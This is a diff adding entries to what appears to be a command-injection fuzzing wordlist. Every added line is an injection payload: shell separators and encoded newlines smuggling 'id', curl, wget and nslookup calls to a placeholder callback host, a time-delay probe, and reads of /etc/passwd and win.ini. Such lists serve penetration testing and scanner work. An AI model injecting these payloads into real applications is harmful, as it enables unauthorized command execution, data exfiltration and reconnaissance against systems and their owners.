@@ -81,3 +81,20 @@ $IFS$9id
 %00id
 %00;id
 ;%00id
+|id
+&id&
+||id
+%0aid%0a
+`id`
+$(id)
+| curl http://callback/
+; curl http://callback/
+| wget http://callback/
+| nslookup callback
+| sleep 5
+| cat /etc/passwd
+| type C:\windows\win.ini
+| whoami
+| id
+$'\\x0aid'
+{id}
